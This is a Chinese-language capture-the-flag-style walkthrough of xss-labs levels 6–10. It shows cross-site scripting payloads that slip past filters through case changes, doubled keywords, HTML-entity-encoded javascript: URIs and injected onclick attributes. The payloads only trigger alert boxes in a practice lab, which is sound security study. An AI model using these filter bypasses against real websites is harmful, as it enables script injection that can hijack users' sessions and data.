## xss-labs level 6-10

### level6

输入第一关的代码进行测试，失败后查看源码：

```html
<input name=keyword  value="<scr_ipt>alert('level1')</script>">
```

使用onclick等事件也会被过滤，a标签的href也会过滤。

再尝试一下大小写绕过：

```html
"/><SCRIPT>alert("level6")</script>
```

成功



### level7

输入第一关的代码进行测试，失败后查看源码：

```html
<input name=keyword  value="<>alert('level1')</>">
```

发现 script 部分被过滤

尝试使用双写绕过

```html
"/> <scrscriptipt>alert(/level7/)</scrscriptipt>
```

成功



### level8

这一关，输入的内容会被当成href添加到下面的友情链接里

尝试注入：

```html
javascript:alert(/level8/)
```



查看源码发现 javascript 部分被过滤

```html
<a href="javascr_ipt:alert(/level8/)">友情链接</a>
```

尝试使用[HTML编码](https://www.qqxiuzi.cn/bianma/zifushiti.php)，将上面的内容编码

```html
javascript:alert(/level8/)
```

  ↓↓↓↓↓

```html
&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x2F;&#x6C;&#x65;&#x76;&#x65;&#x6C;&#x38;&#x2F;&#x29;
```

注入成功



### level9

```html
javascr&#x69;pt:alert(1)//http://
```



### level10

使用 `<script>alert('level1')</script>` 进行测试，查看源码

`<>` 部分被全部过滤





```html
?t_sort=" onclick=alert(1) type="text"
```

